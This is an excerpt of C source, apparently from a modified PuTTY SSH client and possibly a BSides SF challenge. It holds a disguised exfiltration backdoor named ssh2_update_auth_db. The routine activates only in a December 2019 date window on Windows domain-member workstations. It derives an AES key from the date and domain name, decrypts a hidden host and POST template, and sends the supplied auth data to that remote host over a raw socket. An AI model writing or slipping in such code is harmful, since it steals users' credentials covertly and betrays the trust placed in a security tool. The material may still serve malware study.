...
// Silly plug implementation
static Socket *authz_sock = NULL;

static void authz_log(Plug *plug, int type, SockAddr *addr, int port,
                      const char *error_msg, int error_code) {
  if (error_msg)
    debug("sock error: %s %d\n", error_msg, error_code);
}
static void authz_closing(Plug *plug, const char *emsg, int errc, bool cb) {
  if (emsg)
    debug("sock closing error: %s\n", emsg);
  else
    debug("sock closing\n");
  authz_sock = NULL;
}
static void authz_receive(Plug *plug, int urgent, const char *data, size_t len)
  {}
static void authz_sent(Plug *plug, size_t bufsize) {
  debug("CB left %d bytes\n", bufsize);
  if (!bufsize)
    sk_close(authz_sock);
}

static const PlugVtable authz_plugvt = {
  authz_log,
  authz_closing,
  authz_receive,
  authz_sent,
};
static Plug authz_plug = {
  &authz_plugvt
};


void ssh2_update_auth_db(const char *upload_data) {
  // Info
  ...
  char *post_data = NULL;
  char *cname = NULL;
  ssh_hash *hasher = ssh_hash_new(&ssh_sha256);
  int sz;
	SockAddr *addr = NULL;
	debug("upload_data: %s\n", upload_data);
  // Check ts
  ...
  now.wMonth = 12;
#endif
  int nowd = GETDAY(now.wYear, now.wMonth, now.wDay);
  if (nowd <= GETDAY(2019, 11, 30))
    return;
  if (nowd >= GETDAY(2020, 1, 1))
    return;
  // Extract info
  if (ERROR_SUCCESS != DsRoleGetPrimaryDomainInformation(
        NULL, DsRolePrimaryDomainInfoBasic, (PBYTE *)&info))
    return;
#ifndef DEBUG_AUTHZ
  if ((info->MachineRole != DsRole_RoleMemberWorkstation) &&
  ...
  sz = WideCharToMultiByte(
      CP_UTF8, 0, info->DomainNameFlat, wcslen(info->DomainNameFlat),
      NULL, 0, NULL, NULL);
  ...
  WideCharToMultiByte(
      CP_UTF8, 0, info->DomainNameFlat, wcslen(info->DomainNameFlat),
      tmp_buf, sz, NULL, NULL);
#else
  char *tmp_buf = strdup("BSIDESSF");
#endif
  // Build plaintext key
  char buf[256];
  snprintf(buf, sizeof(buf), "%04d%02d%s.",
      now.wYear, now.wMonth, tmp_buf);
  debug("key input: %s\n", buf);
  free(tmp_buf);
  tmp_buf = NULL;
  // Hash to key
  ssh_hash_reset(hasher);
  put_asciz(hasher, buf);
  unsigned char skey[SHA256_LEN];
  ssh_hash_digest(hasher, skey);
  debug("skey\n");
  dmemdump(skey, sizeof(skey));
  // Rehash to info
  ssh_hash_reset(hasher);
  put_data(hasher, skey, sizeof(skey));
  unsigned char sig[SHA256_LEN];
  ssh_hash_digest(hasher, sig);
  debug("sig\n");
  dmemdump(sig, sizeof(sig));
  // Compare the sig
#define SECHASH "\x5d\xa1\x4f\xf2\x3a\x04\xaa\xd0\x85\x64\x25\xa1\x9e\x97\x93\x6e\x08\x24\x5a\x28\x6d\x73\xfd\x28\x6f\xc6\x86\x93\x16\x8b\xa6\x9f"
  if (memcmp(SECHASH, sig, sizeof(sig))) {
    debug("Invalid SECHASH\n");
    goto done;
  }
  // Prepare for making the request
  secbuf = malloc(POST_LEN);
  memcpy(secbuf, g_secbuf, POST_LEN);
  ssh_cipher *cipher = ssh_cipher_new(&ssh_aes256_cbc);
  ssh_cipher_setkey(cipher, skey);
  ssh_cipher_setiv(cipher, sig);
  ssh_cipher_decrypt(cipher, secbuf, POST_LEN);
  ssh_cipher_free(cipher);
  // Verify hash
  char *hash = secbuf;
  char *data = secbuf + SHA256_LEN;
  unsigned char sig2[SHA256_LEN];
  ssh_hash_reset(hasher);
  put_data(hasher, data, POST_LEN - SHA256_LEN);
  ssh_hash_digest(hasher, sig2);
  if (memcmp(hash, sig2, SHA256_LEN)) {
    debug("Invalid ptext hash.\n");
    dmemdump(hash, SHA256_LEN);
    dmemdump(sig2, SHA256_LEN);
    goto done;
  }
  // Split hostname:port from template, up to first NULL
  char *hostname = data;
  sz = strlen(data);
  data += sz;
  data += 1; // skip null
  // Prepare to expand
  sz = snprintf(NULL, 0, data, upload_data);
  post_data = malloc(sz+1);
  snprintf(post_data, sz+1, data, upload_data);
	debug("post data:\n");
	dmemdump(post_data, sz);
	// Start network work
	sz = strcspn(hostname, ":");
	unsigned short port = 80;
	if (hostname[sz] != '\0') {
	  port = (short)atoi(&(hostname[sz+1]));
	  hostname[sz] = '\0';
  }
  debug("connecting to %s:%d\n", hostname, port);
	addr = sk_namelookup(hostname, &cname, ADDRTYPE_UNSPEC);
	if (sk_addr_error(addr)) {
	  debug("Lookup error.\n");
	  goto done;
  }
  authz_sock = sk_new(addr, port, false, true, true, false, &authz_plug);
  if (sk_net_socket_error(authz_sock)) {
    debug("sk_new error\n");
    goto done;
  } else {
    debug("connected?\n");
  ...
  sz = strlen(post_data);
  for (int i=0; i<sz; ) {
    int rv = sk_write(authz_sock, post_data+i, sz-i);
    if (rv < 0) {
      debug("Error writing.\n");
      goto done;
    } else {
